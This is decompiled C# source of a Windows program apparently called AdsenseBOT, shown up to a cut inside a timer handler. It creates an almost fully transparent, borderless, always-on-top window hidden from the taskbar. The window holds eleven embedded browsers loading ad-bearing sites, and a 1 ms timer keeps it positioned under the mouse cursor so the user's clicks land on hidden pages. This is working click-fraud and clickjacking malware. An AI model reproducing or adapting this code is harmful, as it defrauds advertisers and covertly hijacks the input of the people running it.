using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using AdsenseBOT.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace AdsenseBOT;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("WebBrowser1")]
	private WebBrowser _WebBrowser1;

	[AccessedThroughProperty("LocationTimer")]
	private Timer _LocationTimer;

	[AccessedThroughProperty("TimeT")]
	private Timer _TimeT;

	[AccessedThroughProperty("WebBrowser2")]
	private WebBrowser _WebBrowser2;

	[AccessedThroughProperty("WebBrowser3")]
	private WebBrowser _WebBrowser3;

	[AccessedThroughProperty("WebBrowser4")]
	private WebBrowser _WebBrowser4;

	[AccessedThroughProperty("WebBrowser5")]
	private WebBrowser _WebBrowser5;

	[AccessedThroughProperty("WebBrowser6")]
	private WebBrowser _WebBrowser6;

	[AccessedThroughProperty("WebBrowser7")]
	private WebBrowser _WebBrowser7;

	[AccessedThroughProperty("WebBrowser8")]
	private WebBrowser _WebBrowser8;

	[AccessedThroughProperty("WebBrowser9")]
	private WebBrowser _WebBrowser9;

	[AccessedThroughProperty("WebBrowser10")]
	private WebBrowser _WebBrowser10;

	[AccessedThroughProperty("WebBrowser11")]
	private WebBrowser _WebBrowser11;

	[AccessedThroughProperty("RandomNumber")]
	private Timer _RandomNumber;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("CheckerA")]
	private Timer _CheckerA;

	[AccessedThroughProperty("BrowserCheck")]
	private Timer _BrowserCheck;

	private Random Minrn;

	private string n;

	private string A;

	private string Time;

	private string Min;

	private string AppData;

	internal virtual WebBrowser WebBrowser1
	{
		[DebuggerNonUserCode]
		get
		{
			return _WebBrowser1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_WebBrowser1 = value;
		}
	}

	internal virtual Timer LocationTimer
	{
		[DebuggerNonUserCode]
		get
		{
			return _LocationTimer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Location_Tick;
			if (_LocationTimer != null)
			{
				_LocationTimer.remove_Tick(eventHandler);
			}
			_LocationTimer = value;
			if (_LocationTimer != null)
			{
				_LocationTimer.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer TimeT
	{
		[DebuggerNonUserCode]
		get
		{
			return _TimeT;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = TimeT_Tick;
			if (_TimeT != null)
			{
				_TimeT.remove_Tick(eventHandler);
			}
			_TimeT = value;
			if (_TimeT != null)
			{
				_TimeT.add_Tick(eventHandler);
			}
		}
	}

	internal virtual WebBrowser WebBrowser2
	{
		[DebuggerNonUserCode]
		get
		{
			return _WebBrowser2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_WebBrowser2 = value;
		}
	}

	internal virtual WebBrowser WebBrowser3
	{
		[DebuggerNonUserCode]
		get
		{
			return _WebBrowser3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_WebBrowser3 = value;
		}
	}

	internal virtual WebBrowser WebBrowser4
	{
		[DebuggerNonUserCode]
		get
		{
			return _WebBrowser4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_WebBrowser4 = value;
		}
	}

	internal virtual WebBrowser WebBrowser5
	{
		[DebuggerNonUserCode]
		get
		{
			return _WebBrowser5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_WebBrowser5 = value;
		}
	}

	internal virtual WebBrowser WebBrowser6
	{
		[DebuggerNonUserCode]
		get
		{
			return _WebBrowser6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_WebBrowser6 = value;
		}
	}

	internal virtual WebBrowser WebBrowser7
	{
		[DebuggerNonUserCode]
		get
		{
			return _WebBrowser7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_WebBrowser7 = value;
		}
	}

	internal virtual WebBrowser WebBrowser8
	{
		[DebuggerNonUserCode]
		get
		{
			return _WebBrowser8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_WebBrowser8 = value;
		}
	}

	internal virtual WebBrowser WebBrowser9
	{
		[DebuggerNonUserCode]
		get
		{
			return _WebBrowser9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_WebBrowser9 = value;
		}
	}

	internal virtual WebBrowser WebBrowser10
	{
		[DebuggerNonUserCode]
		get
		{
			return _WebBrowser10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_WebBrowser10 = value;
		}
	}

	internal virtual WebBrowser WebBrowser11
	{
		[DebuggerNonUserCode]
		get
		{
			return _WebBrowser11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_WebBrowser11 = value;
		}
	}

	internal virtual Timer RandomNumber
	{
		[DebuggerNonUserCode]
		get
		{
			return _RandomNumber;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RandomNumber_Tick;
			if (_RandomNumber != null)
			{
				_RandomNumber.remove_Tick(eventHandler);
			}
			_RandomNumber = value;
			if (_RandomNumber != null)
			{
				_RandomNumber.add_Tick(eventHandler);
			}
		}
	}

	internal virtual TextBox TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = TextBox1_TextChanged;
			if (_TextBox1 != null)
			{
				((Control)_TextBox1).remove_TextChanged(eventHandler);
			}
			_TextBox1 = value;
			if (_TextBox1 != null)
			{
				((Control)_TextBox1).add_TextChanged(eventHandler);
			}
		}
	}

	internal virtual Timer CheckerA
	{
		[DebuggerNonUserCode]
		get
		{
			return _CheckerA;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_CheckerA != null)
			{
				_CheckerA.remove_Tick(eventHandler);
			}
			_CheckerA = value;
			if (_CheckerA != null)
			{
				_CheckerA.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer BrowserCheck
	{
		[DebuggerNonUserCode]
		get
		{
			return _BrowserCheck;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = BrowserCheck_Tick;
			if (_BrowserCheck != null)
			{
				_BrowserCheck.remove_Tick(eventHandler);
			}
			_BrowserCheck = value;
			if (_BrowserCheck != null)
			{
				_BrowserCheck.add_Tick(eventHandler);
			}
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		__ENCAddToList(this);
		Minrn = new Random();
		AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)MyProject.Forms.Form1);
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Expected O, but got Unknown
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Expected O, but got Unknown
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		//IL_00bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c7: Expected O, but got Unknown
		//IL_00c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d2: Expected O, but got Unknown
		//IL_00d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e3: Expected O, but got Unknown
		//IL_00ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f4: Expected O, but got Unknown
		//IL_09e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_09eb: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		WebBrowser1 = new WebBrowser();
		LocationTimer = new Timer(components);
		TimeT = new Timer(components);
		WebBrowser2 = new WebBrowser();
		WebBrowser3 = new WebBrowser();
		WebBrowser4 = new WebBrowser();
		WebBrowser5 = new WebBrowser();
		WebBrowser6 = new WebBrowser();
		WebBrowser7 = new WebBrowser();
		WebBrowser8 = new WebBrowser();
		WebBrowser9 = new WebBrowser();
		WebBrowser10 = new WebBrowser();
		WebBrowser11 = new WebBrowser();
		RandomNumber = new Timer(components);
		TextBox1 = new TextBox();
		CheckerA = new Timer(components);
		BrowserCheck = new Timer(components);
		((Control)this).SuspendLayout();
		((Control)WebBrowser1).set_Dock((DockStyle)5);
		WebBrowser webBrowser = WebBrowser1;
		Point location = new Point(0, 0);
		((Control)webBrowser).set_Location(location);
		WebBrowser webBrowser2 = WebBrowser1;
		Size minimumSize = new Size(20, 20);
		((Control)webBrowser2).set_MinimumSize(minimumSize);
		((Control)WebBrowser1).set_Name("WebBrowser1");
		WebBrowser1.set_ScriptErrorsSuppressed(true);
		WebBrowser1.set_ScrollBarsEnabled(false);
		WebBrowser webBrowser3 = WebBrowser1;
		minimumSize = new Size(250, 250);
		((Control)webBrowser3).set_Size(minimumSize);
		((Control)WebBrowser1).set_TabIndex(0);
		WebBrowser1.set_Url(new Uri("http://www.simpsonovi-online.jecool.net", UriKind.Absolute));
		LocationTimer.set_Enabled(true);
		LocationTimer.set_Interval(1);
		TimeT.set_Enabled(true);
		TimeT.set_Interval(1);
		((Control)WebBrowser2).set_Dock((DockStyle)5);
		WebBrowser webBrowser4 = WebBrowser2;
		location = new Point(0, 0);
		((Control)webBrowser4).set_Location(location);
		WebBrowser webBrowser5 = WebBrowser2;
		minimumSize = new Size(20, 20);
		((Control)webBrowser5).set_MinimumSize(minimumSize);
		((Control)WebBrowser2).set_Name("WebBrowser2");
		WebBrowser2.set_ScriptErrorsSuppressed(true);
		WebBrowser2.set_ScrollBarsEnabled(false);
		WebBrowser webBrowser6 = WebBrowser2;
		minimumSize = new Size(250, 250);
		((Control)webBrowser6).set_Size(minimumSize);
		((Control)WebBrowser2).set_TabIndex(1);
		WebBrowser2.set_Url(new Uri("http://www.south-park-online.jecool.net", UriKind.Absolute));
		((Control)WebBrowser3).set_Dock((DockStyle)5);
		WebBrowser webBrowser7 = WebBrowser3;
		location = new Point(0, 0);
		((Control)webBrowser7).set_Location(location);
		WebBrowser webBrowser8 = WebBrowser3;
		minimumSize = new Size(20, 20);
		((Control)webBrowser8).set_MinimumSize(minimumSize);
		((Control)WebBrowser3).set_Name("WebBrowser3");
		WebBrowser3.set_ScriptErrorsSuppressed(true);
		WebBrowser3.set_ScrollBarsEnabled(false);
		WebBrowser webBrowser9 = WebBrowser3;
		minimumSize = new Size(250, 250);
		((Control)webBrowser9).set_Size(minimumSize);
		((Control)WebBrowser3).set_TabIndex(2);
		WebBrowser3.set_Url(new Uri("http://www.the-cleveland-show.jecool.net", UriKind.Absolute));
		((Control)WebBrowser4).set_Dock((DockStyle)5);
		WebBrowser webBrowser10 = WebBrowser4;
		location = new Point(0, 0);
		((Control)webBrowser10).set_Location(location);
		WebBrowser webBrowser11 = WebBrowser4;
		minimumSize = new Size(20, 20);
		((Control)webBrowser11).set_MinimumSize(minimumSize);
		((Control)WebBrowser4).set_Name("WebBrowser4");
		WebBrowser4.set_ScriptErrorsSuppressed(true);
		WebBrowser4.set_ScrollBarsEnabled(false);
		WebBrowser webBrowser12 = WebBrowser4;
		minimumSize = new Size(250, 250);
		((Control)webBrowser12).set_Size(minimumSize);
		((Control)WebBrowser4).set_TabIndex(3);
		WebBrowser4.set_Url(new Uri("http://www.fail-videa.cekuj.net", UriKind.Absolute));
		((Control)WebBrowser5).set_Dock((DockStyle)5);
		WebBrowser webBrowser13 = WebBrowser5;
		location = new Point(0, 0);
		((Control)webBrowser13).set_Location(location);
		WebBrowser webBrowser14 = WebBrowser5;
		minimumSize = new Size(20, 20);
		((Control)webBrowser14).set_MinimumSize(minimumSize);
		((Control)WebBrowser5).set_Name("WebBrowser5");
		WebBrowser5.set_ScriptErrorsSuppressed(true);
		WebBrowser5.set_ScrollBarsEnabled(false);
		WebBrowser webBrowser15 = WebBrowser5;
		minimumSize = new Size(250, 250);
		((Control)webBrowser15).set_Size(minimumSize);
		((Control)WebBrowser5).set_TabIndex(4);
		WebBrowser5.set_Url(new Uri("http://www.free-themes.cekuj.net", UriKind.Absolute));
		((Control)WebBrowser6).set_Dock((DockStyle)5);
		WebBrowser webBrowser16 = WebBrowser6;
		location = new Point(0, 0);
		((Control)webBrowser16).set_Location(location);
		WebBrowser webBrowser17 = WebBrowser6;
		minimumSize = new Size(20, 20);
		((Control)webBrowser17).set_MinimumSize(minimumSize);
		((Control)WebBrowser6).set_Name("WebBrowser6");
		WebBrowser6.set_ScriptErrorsSuppressed(true);
		WebBrowser6.set_ScrollBarsEnabled(false);
		WebBrowser webBrowser18 = WebBrowser6;
		minimumSize = new Size(250, 250);
		((Control)webBrowser18).set_Size(minimumSize);
		((Control)WebBrowser6).set_TabIndex(5);
		WebBrowser6.set_Url(new Uri("http://www.griffinovi-online.jecool.net", UriKind.Absolute));
		((Control)WebBrowser7).set_Dock((DockStyle)5);
		WebBrowser webBrowser19 = WebBrowser7;
		location = new Point(0, 0);
		((Control)webBrowser19).set_Location(location);
		WebBrowser webBrowser20 = WebBrowser7;
		minimumSize = new Size(20, 20);
		((Control)webBrowser20).set_MinimumSize(minimumSize);
		((Control)WebBrowser7).set_Name("WebBrowser7");
		WebBrowser7.set_ScriptErrorsSuppressed(true);
		WebBrowser7.set_ScrollBarsEnabled(false);
		WebBrowser webBrowser21 = WebBrowser7;
		minimumSize = new Size(250, 250);
		((Control)webBrowser21).set_Size(minimumSize);
		((Control)WebBrowser7).set_TabIndex(6);
		WebBrowser7.set_Url(new Uri("http://www.futurama-online.jecool.net", UriKind.Absolute));
		((Control)WebBrowser8).set_Dock((DockStyle)5);
		WebBrowser webBrowser22 = WebBrowser8;
		location = new Point(0, 0);
		((Control)webBrowser22).set_Location(location);
		WebBrowser webBrowser23 = WebBrowser8;
		minimumSize = new Size(20, 20);
		((Control)webBrowser23).set_MinimumSize(minimumSize);
		((Control)WebBrowser8).set_Name("WebBrowser8");
		WebBrowser8.set_ScriptErrorsSuppressed(true);
		WebBrowser8.set_ScrollBarsEnabled(false);
		WebBrowser webBrowser24 = WebBrowser8;
		minimumSize = new Size(250, 250);
		((Control)webBrowser24).set_Size(minimumSize);
		((Control)WebBrowser8).set_TabIndex(7);
		WebBrowser8.set_Url(new Uri("http://www.dr-house-online.jecool.net", UriKind.Absolute));
		((Control)WebBrowser9).set_Dock((DockStyle)5);
		WebBrowser webBrowser25 = WebBrowser9;
		location = new Point(0, 0);
		((Control)webBrowser25).set_Location(location);
		WebBrowser webBrowser26 = WebBrowser9;
		minimumSize = new Size(20, 20);
		((Control)webBrowser26).set_MinimumSize(minimumSize);
		((Control)WebBrowser9).set_Name("WebBrowser9");
		WebBrowser9.set_ScriptErrorsSuppressed(true);
		WebBrowser9.set_ScrollBarsEnabled(false);
		WebBrowser webBrowser27 = WebBrowser9;
		minimumSize = new Size(250, 250);
		((Control)webBrowser27).set_Size(minimumSize);
		((Control)WebBrowser9).set_TabIndex(8);
		WebBrowser9.set_Url(new Uri("http://www.jmenuju-se-earl.jecool.net", UriKind.Absolute));
		((Control)WebBrowser10).set_Dock((DockStyle)5);
		WebBrowser webBrowser28 = WebBrowser10;
		location = new Point(0, 0);
		((Control)webBrowser28).set_Location(location);
		WebBrowser webBrowser29 = WebBrowser10;
		minimumSize = new Size(20, 20);
		((Control)webBrowser29).set_MinimumSize(minimumSize);
		((Control)WebBrowser10).set_Name("WebBrowser10");
		WebBrowser10.set_ScriptErrorsSuppressed(true);
		WebBrowser10.set_ScrollBarsEnabled(false);
		WebBrowser webBrowser30 = WebBrowser10;
		minimumSize = new Size(250, 250);
		((Control)webBrowser30).set_Size(minimumSize);
		((Control)WebBrowser10).set_TabIndex(9);
		WebBrowser10.set_Url(new Uri("http://www.htc.cekuj.net/", UriKind.Absolute));
		((Control)WebBrowser11).set_Dock((DockStyle)5);
		WebBrowser webBrowser31 = WebBrowser11;
		location = new Point(0, 0);
		((Control)webBrowser31).set_Location(location);
		WebBrowser webBrowser32 = WebBrowser11;
		minimumSize = new Size(20, 20);
		((Control)webBrowser32).set_MinimumSize(minimumSize);
		((Control)WebBrowser11).set_Name("WebBrowser11");
		WebBrowser11.set_ScriptErrorsSuppressed(true);
		WebBrowser11.set_ScrollBarsEnabled(false);
		WebBrowser webBrowser33 = WebBrowser11;
		minimumSize = new Size(250, 250);
		((Control)webBrowser33).set_Size(minimumSize);
		((Control)WebBrowser11).set_TabIndex(10);
		WebBrowser11.set_Url(new Uri("http://www.dva-a-pul-chlapa-online.jecool.net", UriKind.Absolute));
		RandomNumber.set_Enabled(true);
		TextBox textBox = TextBox1;
		location = new Point(115, 12);
		((Control)textBox).set_Location(location);
		((Control)TextBox1).set_Name("TextBox1");
		((TextBoxBase)TextBox1).set_ReadOnly(true);
		TextBox textBox2 = TextBox1;
		minimumSize = new Size(123, 20);
		((Control)textBox2).set_Size(minimumSize);
		((Control)TextBox1).set_TabIndex(11);
		((Control)TextBox1).set_Visible(false);
		CheckerA.set_Enabled(true);
		CheckerA.set_Interval(1);
		BrowserCheck.set_Enabled(true);
		BrowserCheck.set_Interval(10000);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_AutoSizeMode((AutoSizeMode)0);
		minimumSize = new Size(250, 250);
		((Form)this).set_ClientSize(minimumSize);
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).get_Controls().Add((Control)(object)WebBrowser11);
		((Control)this).get_Controls().Add((Control)(object)WebBrowser10);
		((Control)this).get_Controls().Add((Control)(object)WebBrowser9);
		((Control)this).get_Controls().Add((Control)(object)WebBrowser8);
		((Control)this).get_Controls().Add((Control)(object)WebBrowser7);
		((Control)this).get_Controls().Add((Control)(object)WebBrowser6);
		((Control)this).get_Controls().Add((Control)(object)WebBrowser5);
		((Control)this).get_Controls().Add((Control)(object)WebBrowser4);
		((Control)this).get_Controls().Add((Control)(object)WebBrowser3);
		((Control)this).get_Controls().Add((Control)(object)WebBrowser2);
		((Control)this).get_Controls().Add((Control)(object)WebBrowser1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.01);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_TopMost(true);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Location_Tick(object sender, EventArgs e)
	{
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Invalid comparison between Unknown and I4
		//IL_004c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0051: Unknown result type (might be due to invalid IL or missing references)
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Invalid comparison between Unknown and I4
		//IL_0071: Unknown result type (might be due to invalid IL or missing references)
		//IL_0078: Invalid comparison between Unknown and I4
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_0087: Invalid comparison between Unknown and I4
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		MouseButtons mouseButtons = default(MouseButtons);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				Point location;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 244:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0018;
						case 4:
							goto IL_0049;
						case 6:
						case 7:
							goto IL_0053;
						case 8:
							goto IL_0061;
						case 10:
							goto IL_006d;
						case 12:
							goto IL_007c;
						case 17:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 5:
						case 9:
						case 11:
						case 13:
						case 14:
						case 15:
						case 16:
						case 18:
						case 19:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_007c:
					num = 12;
					if ((int)mouseButtons != 4194304)
					{
					}
					goto end_IL_0001_3;
					IL_006d:
					num = 10;
					if ((int)mouseButtons == 2097152)
					{
						goto end_IL_0001_3;
					}
					goto IL_007c;
					IL_000a:
					num = 2;
					if ((int)((Form)this).get_WindowState() != 0)
					{
						break;
					}
					goto IL_0018;
					IL_0018:
					num = 3;
					location = checked(new Point(Cursor.get_Position().X + -125, Cursor.get_Position().Y + -125));
					((Form)this).set_Location(location);
					goto IL_0049;
					IL_0049:
					num = 4;
					mouseButtons = Control.get_MouseButtons();
					goto IL_0053;
					IL_0053:
					num = 7;
					if ((int)mouseButtons == 1048576)
					{
						goto IL_0061;
					}
					goto IL_006d;
					IL_0061:
					num = 8;
					((Form)this).set_WindowState((FormWindowState)1);
					goto end_IL_0001_3;
					end_IL_0001_2:
					break;
				}
				num = 17;
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 244;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void TimeT_Tick(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					break;
				case 70:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 3:
							goto end_IL_0001_3;
						}
						goto default;
					}
					end_IL_0001_2:
					break;
				}
				num = 2;
				TextBox1.set_Text(DateAndTime.get_Now().ToString("HH/mm/ss"));
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 70;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void RandomNumber_Tick(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		Random random = default(Random);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 3688:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0011;
						case 4:
							goto IL_0027;
						case 5:
							goto IL_0044;
						case 6:
							goto IL_0052;
						case 7:
							goto IL_0060;
						case 8:
							goto IL_006e;
						case 9:
							goto IL_007c;
						case 10:
							goto IL_008b;
						case 11:
							goto IL_009a;
						case 12:
							goto IL_00a9;
						case 13:
							goto IL_00b8;
						case 14:
							goto IL_00c7;
						case 15:
							goto IL_00d6;
						case 16:
						case 17:
							goto IL_00e5;
						case 18:
							goto IL_0103;
						case 19:
							goto IL_0112;
						case 20:
							goto IL_0121;
						case 21:
							goto IL_0130;
						case 22:
							goto IL_013f;
						case 23:
							goto IL_014e;
						case 24:
							goto IL_015d;
						case 25:
							goto IL_016c;
						case 26:
							goto IL_017b;
						case 27:
							goto IL_018a;
						case 28:
							goto IL_0199;
						case 29:
						case 30:
							goto IL_01a8;
						case 31:
							goto IL_01c6;
						case 32:
							goto IL_01d5;
						case 33:
							goto IL_01e4;
						case 34:
							goto IL_01f3;
						case 35:
							goto IL_0202;
						case 36:
							goto IL_0211;
						case 37:
							goto IL_0220;
						case 38:
							goto IL_022f;
						case 39:
							goto IL_023e;
						case 40:
							goto IL_024d;
						case 41:
							goto IL_025c;
						case 42:
						case 43:
							goto IL_026b;
						case 44:
							goto IL_0289;
						case 45:
							goto IL_0298;
						case 46:
							goto IL_02a7;
						case 47:
							goto IL_02b6;
						case 48:
							goto IL_02c5;
						case 49:
							goto IL_02d4;
						case 50:
							goto IL_02e3;
						case 51:
							goto IL_02f2;
						case 52:
							goto IL_0301;
						case 53:
							goto IL_0310;
						case 54:
							goto IL_031f;
						case 55:
						case 56:
							goto IL_032e;
						case 57:
							goto IL_034c;
						case 58:
							goto IL_035b;
						case 59:
							goto IL_036a;
						case 60:
							goto IL_0379;
						case 61:
							goto IL_0388;
						case 62:
							goto IL_0397;
						case 63:
							goto IL_03a6;
						case 64:
							goto IL_03b5;
						case 65:
							goto IL_03c4;
						case 66:
							goto IL_03d3;
						case 67:
							goto IL_03e2;
						case 68:
						case 69:
							goto IL_03f1;
						case 70:
							goto IL_040f;
						case 71:
							goto IL_041e;
						case 72:
							goto IL_042d;
						case 73:
							goto IL_043c;
						case 74:
							goto IL_044b;
						case 75:
							goto IL_045a;
						case 76:
							goto IL_0469;
						case 77:
							goto IL_0478;
						case 78:
							goto IL_0487;
						case 79:
							goto IL_0496;
						case 80:
							goto IL_04a5;
						case 81:
						case 82:
							goto IL_04b4;
						case 83:
							goto IL_04d2;
						case 84:
							goto IL_04e1;
						case 85:
							goto IL_04f0;
						case 86:
							goto IL_04ff;
						case 87:
							goto IL_050e;
						case 88:
							goto IL_051d;
						case 89:
							goto IL_052c;
						case 90:
							goto IL_053b;
						case 91:
							goto IL_054a;
						case 92:
							goto IL_0559;
						case 93:
							goto IL_0568;
						case 94:
						case 95:
							goto IL_0577;
						case 96:
							goto IL_0595;
						case 97:
							goto IL_05a4;
						case 98:
							goto IL_05b3;
						case 99:
							goto IL_05c2;
						case 100:
							goto IL_05d1;
						case 101:
							goto IL_05e0;
						case 102:
							goto IL_05ef;
						case 103:
							goto IL_05fe;
						case 104:
							goto IL_060d;
						case 105:
							goto IL_061c;
						case 106:
							goto IL_062b;
						case 107:
						case 108:
							goto IL_063a;
						case 109:
							goto IL_0658;
						case 110:
							goto IL_0667;
						case 111:
							goto IL_0676;
						case 112:
